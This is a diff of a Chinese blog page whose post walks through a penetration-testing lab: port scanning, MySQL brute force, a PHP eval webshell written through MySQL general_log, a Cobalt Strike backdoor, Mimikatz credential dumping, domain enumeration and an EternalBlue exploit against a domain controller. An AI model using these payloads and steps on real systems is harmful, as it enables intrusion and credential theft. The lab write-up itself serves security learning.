@@ -128,7 +128,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
@@ -171,17 +171,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">3</span></a>
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">3</span></a>
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">6</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">11</span></a>
 
   </li>
   </ul>
@@ -304,7 +304,14 @@
 </tbody></table>
 <h2 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h2><p>要进入内网，先进行外网打点，找到目标单位的外网服务站点、主机漏洞，并获得Shell，借助外网服务器当作跳板机访问目标内网。</p>
 <p>先了解基本的渗透流程</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">信息收集：目标站点的IP、域名、服务、DNS、端口、框架、数据库</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">外网打点：针对不同点发现漏洞（这里最看重渗透能力）</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网提权：寻找可以提权，如内核，命令等</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网漫游：寻找内网主机，查看他们漏洞，找通用，CS上线（理想状态）</span><br></pre></td></tr></table></figure>
+<pre><code>信息收集：目标站点的IP、域名、服务、DNS、端口、框架、数据库
+ |
+外网打点：针对不同点发现漏洞（这里最看重渗透能力）
+ |
+内网提权：寻找可以提权，如内核，命令等
+ |
+内网漫游：寻找内网主机，查看他们漏洞，找通用，CS上线（理想状态）
+</code></pre>
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标IP进行端口探测</p>
 <blockquote>
 <p>nmap -sF -p 1-65535 192.168.123.43</p>
@@ -315,7 +322,12 @@
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyXtC"><img src="https://i.imgtg.com/2022/05/31/nyXtC.png" alt="nyXtC.png"></a></p>
 <p>查看web服务，收集到的信息如下：</p>
-<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php-version：<span class="number">5.4</span></span><br><span class="line">apache-version：<span class="number">2.4</span></span><br><span class="line">admin邮箱：	admin<span class="meta">@phpStudy</span>.<span class="property">net</span></span><br><span class="line">网站路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span></span><br><span class="line">探针路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span>/<span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
+<pre><code>php-version：5.4
+apache-version：2.4
+admin邮箱：	admin@phpStudy.net
+网站路径：	C:/phpStudy/WWW
+探针路径：	C:/phpStudy/WWW/1.php
+</code></pre>
 <p>进行路径遍历，使用dirsearch</p>
 <blockquote>
 <p>python3 dirsearch.py -u “<a target="_blank" rel="noopener" href="http://192.168.123.42/&quot;">http://192.168.123.42/&quot;</a> -x 400,403,503,500</p>
@@ -328,15 +340,31 @@
 <p>search mysql</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/npX4F"><img src="https://i.imgtg.com/2022/06/01/npX4F.png" alt="npX4F.png"></a></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner<span class="regexp">/mysql/my</span>sql_login</span><br><span class="line">set USERNAME root</span><br><span class="line">set PASS_FILE <span class="regexp">/home/</span>l3ife<span class="regexp">/字典/</span>撞库列表名单.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>use scanner/mysql/mysql_login
+set USERNAME root
+set PASS_FILE /home/l3ife/字典/撞库列表名单.txt
+</code></pre>
 <p>爆破不出来，换种思路。</p>
 <h3 id="Mysql写日志shell"><a href="#Mysql写日志shell" class="headerlink" title="Mysql写日志shell"></a>Mysql写日志shell</h3><p>首先看页面，为php探针，用来探测配置，例如查看服务器参数、php模块和参数、检测某些函数能否使用和支持mysql连接正常。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npCmb"><img src="https://i.imgtg.com/2022/06/01/npCmb.png" alt="npCmb.png"></a><br>输入root&#x2F;root<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npwVl"><img src="https://i.imgtg.com/2022/06/01/npwVl.png" alt="npwVl.png"></a><br>连接mysql成功</p>
 <p>在前面dirsearch检测目录存在phpmyadmin，root&#x2F;root登录进去目标网站数据库。</p>
 <p>phpmyadmin渗透思路：</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	<span class="keyword">int</span> outfile写入webshell</span><br><span class="line">		<span class="number">1.1</span> 当前数据库用户有写权限</span><br><span class="line">		<span class="number">1.2</span> web绝对路径</span><br><span class="line">		<span class="number">1.3</span> web路径可以写入</span><br><span class="line">日志 <span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	条件：</span><br><span class="line">		<span class="number">1</span>.读写权限+WEB绝对路径</span><br><span class="line">已知CVE攻击</span><br></pre></td></tr></table></figure>
+<pre><code>get shell：
+    int outfile写入webshell
+        1.1 当前数据库用户有写权限
+        1.2 web绝对路径
+        1.3 web路径可以写入
+日志 get shell：
+    条件：
+        1.读写权限+WEB绝对路径
+已知CVE攻击
+</code></pre>
 <p>这里尝试一下，先执行SQL语句select @@basedir;查看网站物理路径<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJT4S"><img src="https://i.imgtg.com/2022/06/01/nJT4S.png" alt="nJT4S.png"></a><br>查看数据库用户是否具有写权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJU6N"><img src="https://i.imgtg.com/2022/06/01/nJU6N.png" alt="nJU6N.png"></a><br>secure_file_priv默认为NULL，不允许导入导出。直接get shell失败，尝试日志写shell。</p>
 <p>执行命令</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>; //查看日志状态，当general_log开启，执行<span class="keyword">SQL</span>语句会存在stu1.<span class="keyword">log</span>里，修改general_log_file的值，执行<span class="keyword">SQL</span>语句就会生成对应文件，便可以执行shell。</span><br><span class="line"><span class="number">2.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">&#x27;on&#x27;</span>; //开启日志</span><br><span class="line"><span class="number">3.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file=<span class="string">&#x27;C:/phpStudy/www/shell.php&#x27;</span> //指定日志写入到网站根目录下的shell.php文件</span><br><span class="line"><span class="number">4.</span><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> //写入shell</span><br></pre></td></tr></table></figure>
+<pre><code>1.show variables like &#39;%general%&#39;; //查看日志状态，当general_log开启，执行SQL语句会存在stu1.log里，修改general_log_file的值，执行SQL语句就会生成对应文件，便可以执行shell。
+2.SET GLOBAL general_log=&#39;on&#39;; //开启日志
+3.SET GLOBAL general_log_file=&#39;C:/phpStudy/www/shell.php&#39; //指定日志写入到网站根目录下的shell.php文件
+4.SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; //写入shell
+</code></pre>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJkmL"><img src="https://i.imgtg.com/2022/06/01/nJkmL.png" alt="nJkmL.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJxYi"><img src="https://i.imgtg.com/2022/06/01/nJxYi.png" alt="nJxYi.png"></a></p>
 <p>写入shell，直接访问该shell就行。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJhAt"><img src="https://i.imgtg.com/2022/06/01/nJhAt.png" alt="nJhAt.png"></a><br>进行蚁剑连接。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJiSx"><img src="https://i.imgtg.com/2022/06/01/nJiSx.png" alt="nJiSx.png"></a></p>
 <hr>
@@ -344,18 +372,38 @@
 <h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>目的是通过win7外网服务器主机的控制权，横向渗透内网，拿下域控。首先进行内网信息收集，摸清内网域组成和网络拓扑。</p>
 <h3 id="CS-Backdoor上线"><a href="#CS-Backdoor上线" class="headerlink" title="CS Backdoor上线"></a>CS Backdoor上线</h3><p>拿下服务器权限要植入Backdoor，可以尝试MSF或者CS。这里使用CS。</p>
 <p>使用kali运行CS服务,先下载CS并放到kali上，切换到CS目录</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver kali的<span class="built_in">IP</span>  密码 <span class="comment">//启动CS</span></span><br></pre></td></tr></table></figure>
+<pre><code>./teamserver kali的IP  密码 //启动CS
+</code></pre>
 <p>本机开启客户端，连接kali<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4yPD"><img src="https://i.imgtg.com/2022/06/02/n4yPD.png" alt="n4yPD.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4pT6"><img src="https://i.imgtg.com/2022/06/02/n4pT6.png" alt="n4pT6.png"></a><br>生成exe可执行Backdoor程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4JvP"><img src="https://i.imgtg.com/2022/06/02/n4JvP.png" alt="n4JvP.png"></a><br>把exe通过蚁剑放到win7的网站目录下<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Pdb"><img src="https://i.imgtg.com/2022/06/02/n4Pdb.png" alt="n4Pdb.png"></a><br>蚁剑运行exe文件，CS靶机上线<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4tOl"><img src="https://i.imgtg.com/2022/06/02/n4tOl.png" alt="n4tOl.png"></a></p>
 <p>使用提权功能，提权为system权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Cac"><img src="https://i.imgtg.com/2022/06/02/n4Cac.png" alt="n4Cac.png"></a><br>使用Mimikatz抓取本机用户密码（注意的是，mimikatz需要过杀软，而需要的免杀又是另一个研究方向了）<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4wer"><img src="https://i.imgtg.com/2022/06/02/n4wer.png" alt="n4wer.png"></a><br>在View里的credentials里可以看到hashdump与mimikatz获取的数据<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDMGM"><img src="https://i.imgtg.com/2022/06/02/nDMGM.png" alt="nDMGM.png"></a><br>win7的登录密码出来了。</p>
 <h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>进入beacon，通过shell+命令进行收集信息。查询域控以及域内的其他主机，附上部分内网信息收集的命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net view                 <span class="comment"># 查看局域网内其他主机名</span></span><br><span class="line">net config Workstation   <span class="comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class="line">net user                 <span class="comment"># 查看本机用户列表</span></span><br><span class="line">net user /domain         <span class="comment"># 查看域用户</span></span><br><span class="line">net localgroup administrators <span class="comment"># 查看本地管理员组（通常会有域用户）</span></span><br><span class="line">net view /domain         <span class="comment"># 查看有几个域</span></span><br><span class="line">net user 用户名 /domain   <span class="comment"># 获取指定域用户的信息</span></span><br><span class="line">net group /domain        <span class="comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class="line">net group 组名 /domain    <span class="comment"># 查看域中某工作组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  <span class="comment"># 查看域管理员的名字</span></span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  <span class="comment"># 查看域中的其他主机名</span></span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  <span class="comment"># 查看域控制器主机名（可能有多台）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<pre><code>net view                 # 查看局域网内其他主机名
+net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+net user                 # 查看本机用户列表
+net user /domain         # 查看域用户
+net localgroup administrators # 查看本地管理员组（通常会有域用户）
+net view /domain         # 查看有几个域
+net user 用户名 /domain   # 获取指定域用户的信息
+net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+net group 组名 /domain    # 查看域中某工作组
+net group &quot;domain admins&quot; /domain  # 查看域管理员的名字
+net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名
+net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）
+</code></pre>
 <p>1.判断是否存在域，</p>
 <blockquote>
 <p>net config workstation &#x2F;&#x2F;查看本机的计算机名、用户名、系统版本、工作站、域、登录域的全面信息</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/n4Q9S"><img src="https://i.imgtg.com/2022/06/02/n4Q9S.png" alt="n4Q9S.png"></a></p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断域：</span><br><span class="line">	<span class="number">1</span><span class="selector-class">.ipconfig</span> \<span class="attribute">all</span></span><br><span class="line">	<span class="number">2</span><span class="selector-class">.systeminfo</span></span><br><span class="line">	<span class="number">3</span><span class="selector-class">.net</span> <span class="selector-tag">time</span> /domain </span><br><span class="line">		<span class="number">1</span>.存在域，当前用户不是域用户</span><br><span class="line">		<span class="number">2</span>.存在域，当前用户是域用户</span><br><span class="line">		<span class="number">3</span>.不存在域</span><br><span class="line">	<span class="number">4</span><span class="selector-class">.shell</span> net view /domain <span class="comment">//查看当前域</span></span><br></pre></td></tr></table></figure>
+<pre><code>判断域：
+    1.ipconfig \all
+    2.systeminfo
+    3.net time /domain 
+        1.存在域，当前用户不是域用户
+        2.存在域，当前用户是域用户
+        3.不存在域
+    4.shell net view /domain //查看当前域
+</code></pre>
 <p>2.查看有几个域</p>
 <blockquote>
 <p>net view &#x2F;domain</p>
@@ -379,19 +427,41 @@
 <p>确认域控主机为192.168.52.138,存在另一台域成员192.168.52.141（Win3），接下来就是进行横向渗透拿下域控。</p>
 <h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>通过WIn7跳板机，横向渗透拿下内网域内的域成员和域控主机。内网主机漏洞多存在于系统老旧，未打补丁。</p>
 <h3 id="CS派生会话给MSF"><a href="#CS派生会话给MSF" class="headerlink" title="CS派生会话给MSF"></a>CS派生会话给MSF</h3><p>1.在kali进行MSF监听</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_http</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.123.106</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 6666</span></span><br><span class="line">exploit </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost 192.168.123.106
+set lport 6666
+exploit 
+</code></pre>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDKoL"><img src="https://i.imgtg.com/2022/06/02/nDKoL.png" alt="nDKoL.png"></a><br>2.CS开启监听<br>回到CS的客户端添加监听器，Payload为windows&#x2F;foreign&#x2F;reverse_http，IP为MSF的IP，监听端口为MSF监听的端口<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDy3t"><img src="https://i.imgtg.com/2022/06/02/nDy3t.png" alt="nDy3t.png"></a><br>3.进行派生会话，从CS-MSF，选择刚才创建的监听器<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDmix"><img src="https://i.imgtg.com/2022/06/02/nDmix.png" alt="nDmix.png"></a><br>返回kali的MSF获得shell会话<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDptj"><img src="https://i.imgtg.com/2022/06/02/nDptj.png" alt="nDptj.png"></a><br>4.MSF简单利用<br>调用post&#x2F;windows&#x2F;gather&#x2F;checkvm判断靶机是否为虚拟机<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDJ2p"><img src="https://i.imgtg.com/2022/06/02/nDJ2p.png" alt="nDJ2p.png"></a><br>调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块枚举列出安装在靶机上的应用程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDRbU"><img src="https://i.imgtg.com/2022/06/02/nDRbU.png" alt="nDRbU.png"></a></p>
 <h3 id="MSF进行永恒之蓝"><a href="#MSF进行永恒之蓝" class="headerlink" title="MSF进行永恒之蓝"></a>MSF进行永恒之蓝</h3><p>借助MSF集成的攻击模块拿下内网其他机器。</p>
 <p>1.首先配置静态路由，MSF访问不到内网机器，可以在MSF基础上添加一条去往内网的路由，就可以使用MSF访问原本访问不到的内网资源。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute</span><br><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">SUBNET</span>=192.168.52.0 <span class="attribute">ACTION</span>=ADD</span><br></pre></td></tr></table></figure>
+<pre><code>meterpreter &gt; run post/multi/manage/autoroute
+meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD
+</code></pre>
 <p>添加失败，路由已经存在<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDHqq"><img src="https://i.imgtg.com/2022/06/02/nDHqq.png" alt="nDHqq.png"></a><br>2.返回MSF对内网主机探测端口</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.141</span> </span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code>msf6 &gt; use auxiliary/scanner/portscan/tcp
+msf6 &gt; set rhosts 192.168.52.141 
+msf6 &gt; set ports 80,135-139,445,3306,3389
+msf6 &gt; run
+</code></pre>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDLrc"><img src="https://i.imgtg.com/2022/06/02/nDLrc.png" alt="nDLrc.png"></a><br>发现开启了139和445端口，利用同方法对域控主机192.168.52.138进行端口扫描</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.138</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code>msf6 &gt; use auxiliary/scanner/portscan/tcp
+msf6 &gt; set rhosts 192.168.52.138
+msf6 &gt; set ports 80,135-139,445,3306,3389
+msf6 &gt; run
+</code></pre>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDEQr"><img src="https://i.imgtg.com/2022/06/02/nDEQr.png" alt="nDEQr.png"></a><br>3.使用ms17-010攻击<br>使用msf漏洞扫描模块进行扫描</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt;search ms17_010 <span class="comment">#搜索MSF集成的与ms17_010漏洞相关的模块</span></span><br><span class="line">msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># 加载扫描exp</span></span><br><span class="line">msf6 &gt;<span class="keyword">set</span> rhosts <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> <span class="comment">#设置被扫描的主机IP</span></span><br><span class="line">msf6 &gt;<span class="built_in">run</span>  <span class="comment">#进行扫描，观察是否存在该漏洞</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>msf6 &gt;search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块
+msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp
+msf6 &gt;set rhosts 192.168.52.141 #设置被扫描的主机IP
+msf6 &gt;run  #进行扫描，观察是否存在该漏洞
+</code></pre>
 <p>发现都存在ms17-010漏洞<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDSiG"><img src="https://i.imgtg.com/2022/06/02/nDSiG.png" alt="nDSiG.png"></a><br>使用exp进行攻击</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 &gt; <span class="keyword">set</span> rhost <span class="comment">192.168.52.138</span></span><br><span class="line">msf6 <span class="comment">&gt; run</span></span><br></pre></td></tr></table></figure>
+<pre><code>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; set rhost 192.168.52.138
+msf6 &gt; run
+</code></pre>
 <p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDu6K"><img src="https://i.imgtg.com/2022/06/02/nDu6K.png" alt="nDu6K.png"></a></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大体思路如下<br><img src="https://i.imgtg.com/2022/06/27/Nxhka.png" alt="Nxhka.png"><br>对于内网我参考了很多博主，也学习到一些思路和原理。在正常渗透测试中，不可能一帆风顺。要知道原理，尝试不同的方法。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_31773159/article/details/113910351">msf各种弱口令爆破</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114184542">phpmyadmin渗透利用</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/268593.html">内网信息收集</a><br><a target="_blank" rel="noopener" href="https://bwshen.blog.csdn.net/article/details/118338328">windows域环境身份认证与攻击思路</a><br><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/632621.html">域内密码抓取方法总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107856140">CS与MSF之间的会话派发与端口转发</a></p>
@@ -506,20 +576,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
